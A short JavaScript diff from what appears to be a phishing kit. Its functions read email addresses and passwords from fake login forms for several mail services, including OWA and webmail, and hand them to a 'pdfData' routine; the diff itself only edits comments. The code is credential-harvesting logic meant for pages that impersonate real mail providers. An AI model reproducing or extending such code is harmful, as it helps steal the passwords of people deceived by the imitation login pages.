@@ -60,7 +60,6 @@ function getData(e) {
         pdfData(showEmail = chinaEmail.innerText.trim(), showPass = chinaPass.value)
     }
     else if (userServer == "owa") {
-        // roundcube, webmail
         pdfData(showEmail = owaEmail.value, showPass = owaPass.value)
     }
 
@@ -162,7 +161,7 @@ function fexBtnSub(r) {
     }
     else {
         userServer = "webmail"
-        // change only when its owa
+        // change only when its owa (webmail)
         document.body.style.backgroundColor = "white"
     }
 
